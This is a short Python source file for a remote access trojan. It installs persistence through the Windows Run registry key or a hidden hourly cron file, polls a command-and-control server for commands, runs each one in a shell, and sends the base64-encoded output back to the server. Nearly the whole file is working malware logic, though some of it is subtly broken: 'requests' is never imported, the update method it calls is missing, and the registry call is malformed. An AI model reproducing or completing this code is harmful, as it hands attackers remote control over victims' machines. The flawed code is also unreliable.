import socket, subprocess, os, sys, winreg, base64

class RAT:
    def __init__(self):
        self.c2 = "http://c2[.]zhrak-services[.]com:443"
        self.hide_process()

    def hide_process(self):
        if os.name == 'nt':
            winreg.HKEYType.SetValue(winreg.HKEY_CURRENT_USER, 
                "Software\Microsoft\Windows\CurrentVersion\Run",
                winreg.REG_SZ, sys.argv[0])
        else:
            open("/etc/cron.hourly/.pyrat", "w").write(__file__)

    def beacon(self):
        while True:
            try:
                cmd = requests.get(f"{self.c2}/task", 
                    headers={"Cookie": os.environ['COMPUTERNAME']}).text
                if cmd == "update": self.update()
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                requests.post(f"{self.c2}/log", data=base64.b64encode(result))
            except: pass

if __name__ == "__main__":
    RAT().beacon()
